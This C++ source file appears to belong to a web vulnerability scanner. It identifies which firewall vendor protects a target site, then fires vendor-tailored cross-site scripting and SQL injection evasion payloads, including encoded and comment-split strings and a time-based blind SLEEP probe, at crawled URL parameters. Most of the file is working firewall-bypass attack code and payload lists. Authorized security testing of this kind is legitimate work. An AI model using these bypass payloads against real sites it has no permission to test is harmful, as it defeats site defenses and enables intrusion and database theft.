/// @file scanners/waf_evasion.cpp
/// @brief WAF Detection and Evasion Engine: fingerprints the WAF vendor,
///        then applies vendor-specific bypass techniques to all injection payloads.
///        Turns blocked findings into confirmed exploits.
#include <map>
#include <regex>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// WAF fingerprints based on response characteristics.
struct WAFSignature {
  std::string name;
  std::string header_key;
  std::string header_value;
  std::string body_indicator;
  int block_status;
};

const std::vector<WAFSignature> WAF_SIGS = {
    {"Cloudflare", "cf-ray", "", "Attention Required!", 403},
    {"Cloudflare", "server", "cloudflare", "", 403},
    {"AWS WAF", "x-amzn-requestid", "", "Request blocked", 403},
    {"Akamai", "server", "AkamaiGHost", "", 403},
    {"Imperva/Incapsula", "x-iinfo", "", "Request unsuccessful", 403},
    {"Sucuri", "server", "Sucuri", "Access Denied", 403},
    {"ModSecurity", "server", "", "ModSecurity", 403},
    {"F5 BIG-IP", "server", "BigIP", "", 403},
    {"Barracuda", "server", "Barracuda", "", 403},
    {"Fortinet/FortiWeb", "server", "FortiWeb", "", 403},
    {"DenyAll", "server", "", "Condition Intercepted", 403},
    {"Wordfence", "", "", "Wordfence", 403},
    {"Azure Front Door", "x-azure-ref", "", "", 403},
};

/// Detect which WAF is in front of the target.
std::string detect_waf(HttpClient& http, const std::string& base) {
  // Send a clearly malicious request to trigger WAF
  auto resp = http.get(base + "/?id=1'+OR+1=1--+UNION+SELECT+*+FROM+users");

  // Check signatures
  for (const auto& sig : WAF_SIGS) {
    if (!sig.header_key.empty()) {
      for (const auto& [key, val] : resp.headers) {
        std::string lower_key = key;
        std::transform(lower_key.begin(), lower_key.end(), lower_key.begin(), ::tolower);
        if (lower_key == sig.header_key) {
          if (sig.header_value.empty() || val.find(sig.header_value) != std::string::npos) {
            return sig.name;
          }
        }
      }
    }
    if (!sig.body_indicator.empty() && resp.body.find(sig.body_indicator) != std::string::npos) {
      return sig.name;
    }
  }

  // Generic WAF detection: blocked with 403 + generic error page
  if (resp.status_code == 403 || resp.status_code == 406 || resp.status_code == 429) {
    return "Unknown WAF";
  }

  return "";
}

/// WAF-specific XSS bypass payloads.
std::vector<std::string> get_xss_bypasses(const std::string& waf) {
  std::vector<std::string> payloads;

  // Universal bypasses
  payloads.push_back("<svg/onload=alert(1)>");
  payloads.push_back("<img src=x onerror=alert(1)>");
  payloads.push_back("<details open ontoggle=alert(1)>");
  payloads.push_back("<math><mi//xlink:href=\"javascript:alert(1)\">");
  payloads.push_back("'-alert(1)-'");
  payloads.push_back("\"><svg/onload=confirm(1)//");

  if (waf == "Cloudflare") {
    payloads.push_back("<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>");
    payloads.push_back("<a href=\"j&#x61;v&#x61;script:alert(1)\">x</a>");
    payloads.push_back("<iframe/src=\"data:text/html,<script>alert(1)</script>\">");
    payloads.push_back("{{constructor.constructor('alert(1)')()}}");
    payloads.push_back("<script>eval(atob('YWxlcnQoMSk='))</script>");
  } else if (waf == "AWS WAF") {
    payloads.push_back("<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">");
    payloads.push_back("<svg><animate onbegin=alert(1) attributeName=x dur=1s>");
    payloads.push_back("<input onfocus=alert(1) autofocus>");
  } else if (waf == "ModSecurity") {
    payloads.push_back("<svg/onload=\"alert`1`\">");
    payloads.push_back("<img src=x onerror=alert(1)//");
    payloads.push_back("<body/onhashchange=alert(1)><a href=#>x</a>");
  } else if (waf == "Imperva/Incapsula") {
    payloads.push_back("<svg onload=alert(1)//");
    payloads.push_back("<marquee onstart=alert(1)>");
    payloads.push_back("<video><source onerror=alert(1)>");
  }

  return payloads;
}

/// WAF-specific SQLi bypass payloads.
std::vector<std::string> get_sqli_bypasses(const std::string& waf) {
  std::vector<std::string> payloads;

  // Universal
  payloads.push_back("' OR '1'='1");
  payloads.push_back("1' AND 1=1--");
  payloads.push_back("' UNION SELECT NULL--");

  if (waf == "Cloudflare") {
    payloads.push_back("'/*!50000UNION*//*!50000SELECT*/1,2,3--");
    payloads.push_back("' UN/**/ION SEL/**/ECT 1,2,3--");
    payloads.push_back("' uNiOn aLl sElEcT 1,2,3--");
    payloads.push_back("'||'1'='1");
    payloads.push_back("1' AND/**/ 1=1--");
  } else if (waf == "AWS WAF") {
    payloads.push_back("' /*!UNION*/ /*!SELECT*/ 1,2,3--");
    payloads.push_back("'%09UNION%09SELECT%091,2,3--");
    payloads.push_back("' UNION%0aSELECT%0a1,2,3--");
  } else if (waf == "ModSecurity") {
    payloads.push_back("'%0bUNION%0bSELECT%0b1,2,3--");
    payloads.push_back("' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--");
    payloads.push_back("'+UNION+ALL+SELECT+1,2,3--");
  } else if (waf == "Imperva/Incapsula") {
    payloads.push_back("'/**/UNION/**/SELECT/**/1,2,3--");
    payloads.push_back("' UNION SELECT 1,2,3 FROM information_schema.tables WHERE '1'='1");
    payloads.push_back("'%00UNION%00SELECT 1,2,3--");
  }

  return payloads;
}

/// WAF detection and reporting.
std::vector<Finding> scan_waf_detect(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  std::string waf = detect_waf(http, base);
  if (waf.empty()) {
    findings.push_back(Finding{"No WAF Detected", "info", base,
                               "No Web Application Firewall detected. "
                               "Injection payloads can be sent without evasion.",
                               "", "", ""});
  } else {
    findings.push_back(Finding{"WAF Detected — " + waf, "info", base,
                               "Web Application Firewall identified: " + waf +
                                   ". "
                                   "Applying vendor-specific evasion techniques.",
                               "waf", waf, ""});
  }
  return findings;
}

/// Attempt WAF bypass on XSS-vulnerable parameters.
std::vector<Finding> scan_waf_xss_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  std::string waf = detect_waf(http, base);
  auto payloads = get_xss_bypasses(waf);

  // Find reflective params
  for (const auto& url : crawl.urls) {
    auto qpos = url.find('?');
    if (qpos == std::string::npos) continue;

    std::regex param_re(R"x(([^&=]+)=([^&]*))x");
    std::string query = url.substr(qpos + 1);
    std::sregex_iterator it(query.begin(), query.end(), param_re);
    std::sregex_iterator end;

    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string inject_url = url.substr(0, qpos + 1) + param + "=";

      // First check if param reflects
      std::string canary = "apex7x7x7";
      auto check = http.get(inject_url + canary);
      if (check.body.find(canary) == std::string::npos) continue;

      // Param reflects — try bypass payloads
      for (const auto& payload : payloads) {
        auto resp = http.get(inject_url + payload);
        if (resp.status_code == 200 && resp.body.find(payload) != std::string::npos) {
          std::string severity = waf.empty() ? "high" : "critical";
          findings.push_back(
              Finding{waf.empty() ? "XSS Confirmed" : "XSS — WAF Bypass (" + waf + ")", severity, inject_url + payload,
                      "Cross-site scripting confirmed" + (waf.empty() ? "." : " WITH WAF BYPASS (" + waf + ").") + " Payload: " + payload,
                      param, payload, ""});
          return findings;
        }
      }
      return findings;  // Tested one reflecting param
    }
    break;
  }
  return findings;
}

/// Attempt WAF bypass on SQLi-vulnerable parameters.
std::vector<Finding> scan_waf_sqli_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  std::string waf = detect_waf(http, base);
  auto payloads = get_sqli_bypasses(waf);

  for (const auto& url : crawl.urls) {
    auto qpos = url.find('?');
    if (qpos == std::string::npos) continue;

    std::regex param_re(R"x(([^&=]+)=(\d+))x");
    std::string query = url.substr(qpos + 1);
    std::sregex_iterator it(query.begin(), query.end(), param_re);
    std::sregex_iterator end;

    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string orig_val = (*it)[2].str();
      std::string inject_url = url.substr(0, qpos + 1) + param + "=";

      // Baseline
      auto baseline = http.get(inject_url + orig_val);

      for (const auto& payload : payloads) {
        auto resp = http.get(inject_url + orig_val + payload);
        // SQLi indicators
        if (resp.status_code == 200 && resp.body != baseline.body && resp.body.size() > baseline.body.size() &&
            (resp.body.find("SQL") == std::string::npos || resp.body.find("mysql") != std::string::npos ||
             resp.body.find("syntax") != std::string::npos)) {
          // Error-based or content difference = likely SQLi
          if (resp.body.find("mysql") != std::string::npos || resp.body.find("syntax") != std::string::npos ||
              resp.body.find("SQLSTATE") != std::string::npos || resp.body.find("ORA-") != std::string::npos) {
            findings.push_back(
                Finding{waf.empty() ? "SQL Injection — Error Based" : "SQL Injection — WAF Bypass (" + waf + ")", "critical",
                        inject_url + orig_val + payload,
                        "SQL injection confirmed" + (waf.empty() ? "." : " WITH WAF EVASION (" + waf + ").") + " Database error triggered.",
                        param, payload, resp.body.substr(0, 200)});
            return findings;
          }
        }

        // Time-based blind: add SLEEP
        std::string time_payload = orig_val + "' AND SLEEP(5)--";
        auto t_start = std::chrono::steady_clock::now();
        http.get(inject_url + time_payload);
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - t_start).count();
        if (elapsed > 4500) {
          findings.push_back(Finding{
              "SQL Injection — Time-Based Blind" + (waf.empty() ? "" : " (WAF: " + waf + ")"), "critical", inject_url + time_payload,
              "Blind SQL injection confirmed via SLEEP(5). Response delayed " + std::to_string(elapsed) + "ms.", param, time_payload, ""});
          return findings;
        }
      }
      return findings;
    }
    break;
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_waf_evasion_scanners() {
  return {
      {"WAF Detection", scan_waf_detect},
      {"WAF XSS Bypass", scan_waf_xss_bypass},
      {"WAF SQLi Bypass", scan_waf_sqli_bypass},
  };
}

}  // namespace apex
